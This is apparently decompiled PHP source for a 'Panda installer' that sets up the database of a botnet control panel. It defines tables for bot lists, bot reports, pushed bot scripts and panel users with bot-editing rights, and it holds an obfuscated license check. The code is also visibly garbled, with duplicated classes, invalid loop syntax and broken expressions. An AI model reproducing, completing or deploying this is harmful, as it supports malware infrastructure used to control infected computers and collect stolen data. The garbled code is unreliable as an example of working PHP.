			$sequence = $this->oDbh->quoteIdentifier($sequence, true);
			$result = $this->oDbh->exec('SELECT setval(\'' . $sequence . '\\', ' . $value . ', false)');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset sequence ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}
		else if ($aConf['database']['type'] == 'mysql') {
			$result = $this->oDbh->exec('ALTER TABLE ' . $GLOBALS['_MAX']['CONF']['table']['prefix'] . $sequence . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset auto increment on table ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function resetAllSequences()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allSequencesReset = true;
		OA_DB::setCaseSensitive();
		$aSequences = $this->oDbh->manager->listSequences();
		OA_DB::disableCaseSensitive();

		if (is_array($aSequences)) {
			$aTables = $this->aDefinition['tables'];

			if ($this->oDbh->dbsyntax == 'pgsql') {
				foreach ($aSequences as $sequence) {
					$match = false;

					foreach (array_keys($this->aDefinition['tables']) as $tableName) {
						$tableName = substr($aConf['table']['prefix'] . $tableName, 0, 29) . '_';

						if (strpos($sequence, $tableName) === 0) {
							$match = true;
							break;
						}
					}

					if (!$match) {
						continue;
					}

					$sequence .= '_seq';
					OA::debug('Resetting the ' . $sequence . ' sequence', PEAR_LOG_DEBUG);

					if (!$this->resetSequence($sequence)) {
						OA::debug('Unable to reset the sequence ' . $sequence, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
			else if ($this->oDbh->dbsyntax == 'mysql') {
				foreach (array_keys($this->aDefinition['tables']) as $tableName) {
					if (!$this->resetSequence($tableName)) {
						OA::debug('Unable to reset the auto-increment for ' . $tableName, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
		}

		return $allSequencesReset;
	}

	public function _getRequiredTables($table, $aLinks = NULL, $aSkip = NULL, $level = 0)
	{
		if (is_null($aLinks)) {
			require_once MAX_PATH . '/lib/OA/Dal/Links.php';
			$aLinks = Openads_Links::readLinksDotIni(MAX_PATH . '/lib/max/Dal/DataObjects/db_schema.links.ini');
		}

		$aTables = array();

		if (isset($aLinks[$table])) {
			foreach ($aLinks[$table] as $aLink) {
				$refTable = $aLink['table'];
				$aTables[$refTable] = $level;

				foreach (array_keys($aTables) as $refTable) {
					if (!isset($aSkip[$refTable])) {
						$aTables = $this->_getRequiredTables($refTable, $aLinks, $aTables, $level + 1) + $aTables;
					}
				}
			}
		}

		if (!$level) {
			arsort(&$aTables);
			return array_keys($aTables);
		}
		else {
			return $aTables;
		}
	}

	public function _generateTableName($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		if ($aConf['table']['prefix'] && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$tableName = $aConf['table']['prefix'] . $tableName;
		}

		return $tableName;
	}

	public function _generateIndexName($table, $index)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		$origTable = substr($table, strlen($aConf['table']['prefix']));
		return substr($tableName . '_' . preg_replace('/^' . $origTable . '_/', '', $index), 0, 63);
	}

	public function resetSequenceByData($table, $field)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$prefix = $this->getPrefix();
			$tableName = $prefix . $table;
			$sequenceName = OA_DB::getSequenceName($this->oDbh, $table, $field);
			$qSeq = $this->oDbh->quoteIdentifier($sequenceName, true);
			$qFld = $this->oDbh->quoteIdentifier($field, true);
			$qTbl = $this->oDbh->quoteIdentifier($tableName, true);
			$sql = 'SELECT setval(' . $this->oDbh->quote($qSeq) .  . ', MAX(' . $qFld . ')) FROM ' . $qTbl;
			$result = $this->oDbh->exec($sql);

			if (PEAR::isError($result)) {
				return $result;
			}
		}

		return true;
	}

	public function getPrefix()
	{
		return $GLOBALS['_MAX']['CONF']['table']['prefix'];
	}

	public function checkTable($tableName)
	{
		$aConf = $GLOBALS['_MAX']['CONF']['table'];
		$oDbh = OA_DB::singleton();
		$tableName = $oDbh->quoteIdentifier($aConf['prefix'] . ($aConf[$tableName] ? $aConf[$tableName] : $tableName), true);
		$aResult = $oDbh->manager->checkTable($tableName);

		if ($aResult['msg_text'] !== 'OK') {
			OA::debug('PROBLEM WITH TABLE ' . $tableName . ': ' . $aResult['msg_text'], PEAR_LOG_ERR);
			return false;
		}

		OA::debug($tableName . ': Status = OK');
		return true;
	}
}

class f53jk8 extends rhqjlxderbk
{
	/**
     * An instance of the OA_DB class.
     *
     * @var OA_DB
     */
	public $oDbh;
	/**
     * An instance of the MDB2_Schema class.
     *
     * @var MDB2_Schema
     */
	public $oSchema;
	/**
     * An array containing the database definition, as parsed from
     * the XML schema file.
     *
     * @var array
     */
	public $aDefinition;
	/**
     * Should the tables be created as temporary tables?
     *
     * @var boolean
     */
	public $temporary = false;
	public $cached_definition = true;

	public function __construct()
	{
		!($r = $this->cmp()) || exit($r);
	}

	public function OA_DB_Table()
	{
		$this->oDbh = &$this->_getDbConnection();
	}

	public function _getDbConnection()
	{
	}

	public function init($file, $useCache = true)
	{
		if (!is_readable($file)) {
			OA::debug('Unable to read the database XML schema file: ' . $file, PEAR_LOG_ERR);
			return false;
		}

		$options = array('force_defaults' => false);
		$this->oSchema = &MDB2_Schema::factory($this->oDbh, $options);

		if ($useCache) {
			$oCache = new OA_DB_XmlCache();
			$this->aDefinition = $oCache->get($file);
			$this->cached_definition = true;
		}
		else {
			$this->aDefinition = false;
		}

		if (!$this->aDefinition) {
			$this->cached_definition = false;
			$this->aDefinition = $this->oSchema->parseDatabaseDefinitionFile($file);

			if (PEAR::isError($this->aDefinition)) {
				OA::debug('Error parsing the database XML schema file: ' . $file, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function _checkInit()
	{
		if (is_null($this->aDefinition)) {
			OA::debug('No database XML schema file parsed, cannot create table', PEAR_LOG_ERR);
			return false;
		}
		else if (PEAR::isError($this->aDefinition)) {
			OA::debug('Previous error parsing the database XML schema file', PEAR_LOG_ERR);
			return false;
		}

		return true;
	}

	public function listOATablesCaseSensitive($like = '')
	{
		OA_DB::setCaseSensitive();
		$oDbh = &OA_DB::singleton();
		$aDBTables = $oDbh->manager->listTables(NULL, $GLOBALS['_MAX']['CONF']['table']['prefix'] . $like);
		OA_DB::disableCaseSensitive();
		return $aDBTables;
	}

	public function createTable($table, $oDate = NULL, $suppressTempTableError = false)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		if (!is_array($this->aDefinition['tables'][$table])) {
			OA::debug('Cannot find table ' . $table . ' in the XML schema file', PEAR_LOG_ERR);
			return false;
		}

		$tableName = $this->_generateTableName($table, $oDate);
		$aOptions = array();

		if ($this->temporary) {
			$aOptions['temporary'] = true;
		}

		$aOptions['type'] = $aConf['table']['type'];

		if (isset($this->aDefinition['tables'][$table]['indexes'])) {
			if (is_array($this->aDefinition['tables'][$table]['indexes'])) {
				foreach ($this->aDefinition['tables'][$table]['indexes'] as $aIndex => ) {
					$key = ($aConf = $GLOBALS['_MAX']['CONF']);
					if (isset($aIndex['primary']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
						$aOptions['primary'] = $aIndex['fields'];
						$indexName = $tableName . '_pkey';
					}
					else {
						$indexName = $this->_generateIndexName($tableName, $key);
					}

					if ($key != $indexName) {
						$this->aDefinition['tables'][$table]['indexes'][$indexName] = $this->aDefinition['tables'][$table]['indexes'][$key];
						unset($this->aDefinition['tables'][$table]['indexes'][$key]);
					}
				}
			}
		}

		OA::debug('Creating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		OA_DB::setCaseSensitive();
		$result = $this->oSchema->createTable($tableName, $this->aDefinition['tables'][$table], false, $aOptions);
		OA_DB::disableCaseSensitive();
		OA::enableErrorHandling();
		if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$showError = true;
			if ($this->temporary && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$showError = false;
			}
			if ($showError) {
				OA::debug('Unable to create the table ' . $table, PEAR_LOG_ERR);

				if (PEAR::isError($result)) {
					OA::debug($result->getUserInfo(), PEAR_LOG_ERR);
				}
			}

			return false;
		}

		return $tableName;
	}

	public function createAllTables($oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		foreach ($this->aDefinition['tables'] as $aTable => ) {
			$tableName = $this->_checkInit();
			$result = $this->createTable($tableName, $oDate);
			if (PEAR::isError($result) || $this->_checkInit()) {
				return false;
			}
		}

		return true;
	}

	public function createRequiredTables($table, $oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		$aTableNames = $this->_getRequiredTables($table);
		$result = $this->createTable($table, $oDate);

		if (!$result) {
			return false;
		}

		foreach ($aTableNames as $tableName) {
			$result = $this->createTable($tableName, $oDate);

			if (!$result) {
				return false;
			}
		}

		return true;
	}

	public function extistsTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = preg_replace('/^' . $aConf['table']['prefix'] . '/', '', $table);
		$aResult = $this->listOATablesCaseSensitive($tableName);
		if (is_array($aResult) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			return true;
		}

		return false;
	}

	public function existsTemporaryTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Checking for temporary table ' . $table, PEAR_LOG_DEBUG);
		$query = 'SELECT * FROM ' . $this->oDbh->quoteIdentifier($table, true);
		OA::disableErrorHandling();
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Temporary table exists ' . $table, PEAR_LOG_ERR);
			return false;
		}

		OA::debug('Not found ' . $table, PEAR_LOG_ERR);
		return true;
	}

	public function dropTable($table)
	{
		OA::debug('Dropping table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$result = $this->oDbh->manager->dropTable($table);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to drop table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if (!$this->dropSequence($table)) {
		}

		return true;
	}

	public function dropAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesDropped = true;

		foreach ($this->aDefinition['tables'] as $aTable => ) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Dropping the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->dropTable($aConf['table']['prefix'] . $tableName);
			if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				OA::debug('Unable to drop the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesDropped = false;
			}
		}

		return $allTablesDropped;
	}

	public function truncateTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Truncating table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$query = 'TRUNCATE TABLE ' . $this->oDbh->quoteIdentifier($table, true);
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to truncate table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if ($aConf['database']['type'] == 'mysql') {
			OA::disableErrorHandling();
			$result = $this->oDbh->exec('ALTER TABLE ' . $table . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to set mysql auto_increment to 1', PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function cmp()
	{
		$file = __DIR__ . '/../' . base64_decode('bGljZW5zZS5kYXQ=');

		if (file_exists($file)) {
			$data = file_get_contents($file);
			$key = substr($data, 0, 32);
			$iv = substr($data, 32, 16);
			$key = pack('H*', hash('sha256', md5($key . $iv)));
			$decoded = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, substr($data, 48), MCRYPT_MODE_CBC, $iv);
			$decoded = rtrim($decoded, "\0");
			$sparam = unserialize($decoded);
			if ($sparam && (__DIR__ . '/../') && (__DIR__ . '/../') && (__DIR__ . '/../') && (__DIR__ . '/../')) {
				$st = true;
				if ($sparam[PT_I] && (__DIR__ . '/../')) {
					$st = false;
				}

				if ($sparam[PT_H] && (__DIR__ . '/../')) {
					$st = false;
				}

				if ($sparam[PT_P] && (__DIR__ . '/../')) {
					$st = false;
				}
				if ($st) {
					return NULL;
				}
			}

			return base64_decode('SW52YWxpZCBsaWNlbnNl');
		}

		return base64_decode('Tm8gbGljZW5zZSBmaWxl');
	}

	public function truncateAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesTruncated = true;

		foreach ($this->aDefinition['tables'] as $aTable => ) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Truncating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->truncateTable($aConf['table']['prefix'] . $tableName);

			if (PEAR::isError($result)) {
				OA::debug('Unable to truncate the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesTruncated = false;
			}
		}

		return $allTablesTruncated;
	}

	public function dropSequence($table)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$aConf = $GLOBALS['_MAX']['CONF'];
			OA_DB::setCaseSensitive();
			$aSequences = $this->oDbh->manager->listSequences();
			OA_DB::disableCaseSensitive();

			foreach ($aSequences as $sequence) {
				if (strpos($sequence, $table . '_') === 0) {
					$sequence .= '_seq';
					OA::debug('Dropping sequence ' . $sequence, PEAR_LOG_DEBUG);
					OA::disableErrorHandling();
					$result = $this->oDbh->exec('DROP SEQUENCE "' . $sequence . '"');
					OA::enableErrorHandling();

					if (PEAR::isError($result)) {
						OA::debug('Unable to drop the sequence ' . $sequence, PEAR_LOG_ERR);
						return false;
					}

					break;
				}
			}
		}

		return true;
	}

	public function resetSequence($sequence, $value = 1)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Resetting sequence ' . $sequence, PEAR_LOG_DEBUG);
		OA::disableErrorHandling(NULL);

		if ($aConf['database']['type'] == 'pgsql') {
			if ($value < 1) {
				$value = 1;
			}
			else {
				$value = (int) $value;
			}

			$sequence = $this->oDbh->quoteIdentifier($sequence, true);
			$result = $this->oDbh->exec('SELECT setval(\'' . $sequence . '\\', ' . $value . ', false)');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset sequence ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}
		else if ($aConf['database']['type'] == 'mysql') {
			$result = $this->oDbh->exec('ALTER TABLE ' . $GLOBALS['_MAX']['CONF']['table']['prefix'] . $sequence . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset auto increment on table ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function resetAllSequences()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allSequencesReset = true;
		OA_DB::setCaseSensitive();
		$aSequences = $this->oDbh->manager->listSequences();
		OA_DB::disableCaseSensitive();

		if (is_array($aSequences)) {
			$aTables = $this->aDefinition['tables'];

			if ($this->oDbh->dbsyntax == 'pgsql') {
				foreach ($aSequences as $sequence) {
					$match = false;

					foreach (array_keys($this->aDefinition['tables']) as $tableName) {
						$tableName = substr($aConf['table']['prefix'] . $tableName, 0, 29) . '_';

						if (strpos($sequence, $tableName) === 0) {
							$match = true;
							break;
						}
					}

					if (!$match) {
						continue;
					}

					$sequence .= '_seq';
					OA::debug('Resetting the ' . $sequence . ' sequence', PEAR_LOG_DEBUG);

					if (!$this->resetSequence($sequence)) {
						OA::debug('Unable to reset the sequence ' . $sequence, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
			else if ($this->oDbh->dbsyntax == 'mysql') {
				foreach (array_keys($this->aDefinition['tables']) as $tableName) {
					if (!$this->resetSequence($tableName)) {
						OA::debug('Unable to reset the auto-increment for ' . $tableName, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
		}

		return $allSequencesReset;
	}

	public function _getRequiredTables($table, $aLinks = NULL, $aSkip = NULL, $level = 0)
	{
		if (is_null($aLinks)) {
			require_once MAX_PATH . '/lib/OA/Dal/Links.php';
			$aLinks = Openads_Links::readLinksDotIni(MAX_PATH . '/lib/max/Dal/DataObjects/db_schema.links.ini');
		}

		$aTables = array();

		if (isset($aLinks[$table])) {
			foreach ($aLinks[$table] as $aLink) {
				$refTable = $aLink['table'];
				$aTables[$refTable] = $level;

				foreach (array_keys($aTables) as $refTable) {
					if (!isset($aSkip[$refTable])) {
						$aTables = $this->_getRequiredTables($refTable, $aLinks, $aTables, $level + 1) + $aTables;
					}
				}
			}
		}

		if (!$level) {
			arsort(&$aTables);
			return array_keys($aTables);
		}
		else {
			return $aTables;
		}
	}

	public function _generateTableName($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		if ($aConf['table']['prefix'] && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$tableName = $aConf['table']['prefix'] . $tableName;
		}

		return $tableName;
	}

	public function _generateIndexName($table, $index)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		$origTable = substr($table, strlen($aConf['table']['prefix']));
		return substr($tableName . '_' . preg_replace('/^' . $origTable . '_/', '', $index), 0, 63);
	}

	public function resetSequenceByData($table, $field)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$prefix = $this->getPrefix();
			$tableName = $prefix . $table;
			$sequenceName = OA_DB::getSequenceName($this->oDbh, $table, $field);
			$qSeq = $this->oDbh->quoteIdentifier($sequenceName, true);
			$qFld = $this->oDbh->quoteIdentifier($field, true);
			$qTbl = $this->oDbh->quoteIdentifier($tableName, true);
			$sql = 'SELECT setval(' . $this->oDbh->quote($qSeq) .  . ', MAX(' . $qFld . ')) FROM ' . $qTbl;
			$result = $this->oDbh->exec($sql);

			if (PEAR::isError($result)) {
				return $result;
			}
		}

		return true;
	}

	public function getPrefix()
	{
		return $GLOBALS['_MAX']['CONF']['table']['prefix'];
	}

	public function checkTable($tableName)
	{
		$aConf = $GLOBALS['_MAX']['CONF']['table'];
		$oDbh = OA_DB::singleton();
		$tableName = $oDbh->quoteIdentifier($aConf['prefix'] . ($aConf[$tableName] ? $aConf[$tableName] : $tableName), true);
		$aResult = $oDbh->manager->checkTable($tableName);

		if ($aResult['msg_text'] !== 'OK') {
			OA::debug('PROBLEM WITH TABLE ' . $tableName . ': ' . $aResult['msg_text'], PEAR_LOG_ERR);
			return false;
		}

		OA::debug($tableName . ': Status = OK');
		return true;
	}
}

function ShowError($text)
{
	global $_OUTPUT;
	$_OUTPUT .= THEME_DIALOG_ROW_BEGIN . str_replace('{TEXT}', '&#8226; ERROR:' . $text, THEME_DIALOG_ITEM_ERROR) . THEME_DIALOG_ROW_END;
}

function ShowProgress($text)
{
	global $_OUTPUT;
	$_OUTPUT .= THEME_DIALOG_ROW_BEGIN . str_replace('{TEXT}', '&#8226; ' . $text, THEME_DIALOG_ITEM_SUCCESSED) . THEME_DIALOG_ROW_END;
}

function CreateTable($name)
{
	global $_TABLES;
	showprogress('Creating table ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $name . '\'' . THEME_STRING_BOLD_END . '.');
	if (!@mysql_query('DROP TABLE IF EXISTS `' . $name . '`') || $GLOBALS['_TABLES']) {
		showerror('Failed: ' . htmlEntitiesEx(mysql_error()));
		return false;
	}

	return true;
}

function UpdateTable($name)
{
	global $_TABLES;
	showprogress('Updating table ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $name . '\'' . THEME_STRING_BOLD_END . '.');

	if (!@mysql_query('CREATE TABLE IF NOT EXISTS `' . $name . '` (' . $_TABLES[$name] . ') ENGINE=MyISAM CHARACTER SET=' . MYSQL_CODEPAGE . ' COLLATE=' . MYSQL_COLLATE)) {
		showerror('Failed: ' . htmlEntitiesEx(mysql_error()));
		return false;
	}

	$list = explode(',', $_TABLES[$name]);

	foreach ($list as ) {
		$l = &#foreachBox#;
		@mysql_query('ALTER TABLE `' . $name . '` ADD ' . $l);
	}

	return true;
}

function UpdateTableEx($name, $real_name)
{
	global $_TABLES;
	showprogress('Updating table ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $name . '\'' . THEME_STRING_BOLD_END . '.');

	if (!@mysql_query('CREATE TABLE IF NOT EXISTS `' . $name . '` (' . $_TABLES[$real_name] . ') ENGINE=MyISAM CHARACTER SET=' . MYSQL_CODEPAGE . ' COLLATE=' . MYSQL_COLLATE)) {
		showerror('Failed: ' . htmlEntitiesEx(mysql_error()));
		return false;
	}

	$list = explode(',', $_TABLES[$real_name]);

	foreach ($list as ) {
		$l = &#foreachBox#;
		@mysql_query('ALTER TABLE `' . $name . '` ADD ' . $l);
	}

	return true;
}

function AddRowToTable($name, $query)
{
	if (!mysql_query('INSERT INTO `' . $name . '` SET ' . $query)) {
		showerror('Failed to write row to table ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $name . '\'' . THEME_STRING_BOLD_END . ': %s' . htmlEntitiesEx(mysql_error()));
		return false;
	}

	return true;
}

function CreatePath($new_dir, $old_dir)
{
	$dir_r = '../' . $new_dir;
	if (($old_dir != 0) && ('../' . $new_dir) && ('../' . $new_dir)) {
		showprogress('Renaming folder ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $old_dir . '\'' . THEME_STRING_BOLD_END . ' to ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $new_dir . '\'' . THEME_STRING_BOLD_END . '.');
		if (!is_dir($dir_r) && ('../' . $new_dir)) {
			showerror('Failed to rename folder.');
			return false;
		}

		@chmod($dir_r, 511);
	}
	else {
		showprogress('Creating folder ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $new_dir . '\'' . THEME_STRING_BOLD_END . '.');
		if (!is_dir($dir_r) && ('../' . $new_dir)) {
			showerror('Failed to create folder ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $new_dir . '\'' . THEME_STRING_BOLD_END . '.');
			return false;
		}

	}

	return true;
}

define('__INSTALL__', 1);
require_once '../system/global.php';
define('FILE_GEOBASE', 'ipv4toc.csv');
define('FILE_CONFIG', '../system/config.php');
define('APP_TITLE', 'Panda installer');
define('DIALOG_WIDTH', '350px');
define('DIALOG_INPUT_WIDTH', '150px');
define('THEME_PATH', '../theme');
require_once THEME_PATH . '/index.php';
$_TABLES['botnet_list'] = '`bot_id`         varchar(' . BOT_ID_MAX_CHARS . ') NOT NULL default \'\' UNIQUE, ' . '`botnet`         varchar(' . BOTNET_MAX_CHARS . ') NOT NULL default \'' . DEFAULT_BOTNET . '\\', ' . '`bot_version`    int unsigned      NOT NULL default \'0\', ' . '`net_latency`    int unsigned      NOT NULL default \'0\', ' . '`tcpport_s1`     smallint unsigned NOT NULL default \'0\', ' . '`time_localbias` int signed        NOT NULL default \'0\', ' . '`os_version`     tinyblob  NOT NULL, ' . '`language_id`    smallint unsigned NOT NULL default \'0\', ' . '`ipv4_list`      blob              NOT NULL, ' . '`ipv6_list`      blob              NOT NULL, ' . '`ipv4`           varbinary(4)      NOT NULL default \'\\0\\0\\0\\0\', ' . '`country`        varchar(2)        NOT NULL default \'--\', ' . '`geo_detail`     varchar(250)      , ' . '`rtime_first`    int unsigned      NOT NULL default \'0\', ' . '`rtime_last`     int unsigned      NOT NULL default \'0\', ' . '`rtime_online`   int unsigned      NOT NULL default \'0\', ' . '`flag_new`       bool              NOT NULL default \'1\', ' . '`flag_used`      bool              NOT NULL default \'0\', ' . '`comment`        tinytext          NOT NULL';
$_TABLES['botnet_reports'] = '`id`             int unsigned      NOT NULL auto_increment PRIMARY KEY, ' . '`bot_id`         varchar(' . BOT_ID_MAX_CHARS . ') NOT NULL default \'\\', ' . '`botnet`         varchar(' . BOTNET_MAX_CHARS . ') NOT NULL default \'' . DEFAULT_BOTNET . '\\', ' . '`bot_version`    int unsigned      NOT NULL default \'0\', ' . '`path_source`    text              NOT NULL, ' . '`path_dest`      text              NOT NULL, ' . '`time_system`    int unsigned      NOT NULL default \'0\', ' . '`time_tick`      int unsigned      NOT NULL default \'0\', ' . '`time_localbias` int               NOT NULL default \'0\', ' . '`os_version`     tinyblob    NOT NULL, ' . '`language_id`    smallint unsigned NOT NULL default \'0\', ' . '`process_name`   text NOT NULL, ' . '`process_user`   text NOT NULL, ' . '`type`           int unsigned      NOT NULL default \'0\', ' . '`context`        longtext          NOT NULL, ' . '`ipv4`           varbinary(15)     NOT NULL default \'0.0.0.0\', ' . '`country`        varchar(2)        NOT NULL default \'--\', ' . '`rtime`          int unsigned      NOT NULL default \'0\'';
$_TABLES['ipv4toc'] = '`l` int unsigned NOT NULL default \'0\' PRIMARY KEY, ' . '`h` int unsigned NOT NULL default \'0\', ' . '`c` varbinary(2) NOT NULL default \'--\',' . '`detail` varchar(250)';
$_TABLES['cp_users'] = '`id`            int unsigned    NOT NULL auto_increment PRIMARY KEY, ' . '`name`          varchar(20)     NOT NULL default \'\' UNIQUE, ' . '`pass`          varchar(32)     NOT NULL default \'\\', ' . '`language`      varbinary(2)    NOT NULL default \'en\', ' . '`flag_enabled`  bool            NOT NULL default \'1\', ' . '`comment`       tinytext        NOT NULL, ' . '`ss_format`    varbinary(10)    NOT NULL default \'jpeg\', ' . '`ss_quality`   tinyint unsigned NOT NULL default \'30\', ' . '`r_edit_bots`           bool NOT NULL default \'1\', ' . '`r_stats_main`          bool NOT NULL default \'1\', ' . '`r_stats_main_reset`    bool NOT NULL default \'1\', ' . '`r_stats_os`            bool NOT NULL default \'1\', ' . '`r_botnet_bots`         bool NOT NULL default \'1\', ' . '`r_botnet_scripts`      bool NOT NULL default \'1\', ' . '`r_botnet_scripts_edit` bool NOT NULL default \'1\', ' . '`r_reports_db`          bool NOT NULL default \'1\', ' . '`r_reports_db_edit`     bool NOT NULL default \'1\', ' . '`r_reports_files`       bool NOT NULL default \'1\', ' . '`r_reports_files_edit`  bool NOT NULL default \'1\', ' . '`r_reports_jn`          bool NOT NULL default \'1\', ' . '`r_system_info`         bool NOT NULL default \'1\', ' . '`r_system_options`      bool NOT NULL default \'1\', ' . '`r_system_user`         bool NOT NULL default \'1\', ' . '`r_system_users`        bool NOT NULL default \'1\'';
$_TABLES['botnet_scripts'] = '`id`           int unsigned  NOT NULL auto_increment PRIMARY KEY,' . '`extern_id`    varbinary(16) NOT NULL default \'0\', ' . '`name`         varchar(255)  NOT NULL default \'\\', ' . '`flag_enabled` bool          NOT NULL default \'0\', ' . '`time_created` int unsigned  NOT NULL default \'0\', ' . '`send_limit`   int unsigned  NOT NULL default \'0\', ' . '`bots_wl`      text          NOT NULL, ' . '`bots_bl`      text          NOT NULL, ' . '`botnets_wl`   text          NOT NULL, ' . '`botnets_bl`   text          NOT NULL, ' . '`countries_wl` text          NOT NULL, ' . '`countries_bl` text          NOT NULL, ' . '`script_text`   text         NOT NULL, ' . '`script_bin`    blob         NOT NULL';
$_TABLES['botnet_scripts_stat'] = '`extern_id`   varbinary(16)                 NOT NULL, ' . '`type`        tinyint unsigned              NOT NULL default \'0\', ' . '`bot_id`      varchar(' . BOT_ID_MAX_CHARS . ') NOT NULL default \'\\', ' . '`bot_version` int unsigned                  NOT NULL default \'0\', ' . '`rtime`       int unsigned                  NOT NULL default \'0\', ' . '`report`      text                          NOT NULL, ' . 'UNIQUE(`extern_id`, `bot_id`, `type`)';
$subsql = array();
$subsql[] = 'DROP TABLE IF EXISTS `normalizer`;';
$subsql[] = 'CREATE TABLE IF NOT EXISTS `normalizer` (' . "\n" . '`id` int(11) unsigned NOT NULL,' . "\n" . '  `name` varchar(50) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `url` varchar(250) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `bot_id` varchar(50) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `logtime` int(11) unsigned NOT NULL' . "\n" . ') ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci PACK_KEYS=0 AUTO_INCREMENT=0;';
$subsql[] = 'DROP TABLE IF EXISTS `normalizer_values`;';
$subsql[] = 'CREATE TABLE IF NOT EXISTS `normalizer_values` (' . "\n" . '  `fk_normalizer` int(11) unsigned NOT NULL,' . "\n" . '  `field` varchar(250) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `value` varchar(250) COLLATE utf8_unicode_ci NOT NULL' . "\n" . ') ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci PACK_KEYS=0;';
$subsql[] = 'ALTER TABLE `normalizer`' . "\n" . ' ADD PRIMARY KEY (`id`), ADD KEY `normalizer_idx1` (`bot_id`), ADD KEY `normalizer_idx2` (`name`);';
$subsql[] = 'ALTER TABLE `normalizer_values`' . "\n" . ' ADD KEY `normalizer_values_idx1` (`fk_normalizer`);';
$subsql[] = 'ALTER TABLE `normalizer`' . "\n" . 'MODIFY `id` int(11) unsigned NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=0;';
$subsql[] = 'ALTER TABLE `botnet_reports` ADD INDEX `idx_botnet_reports` (`botnet`);';
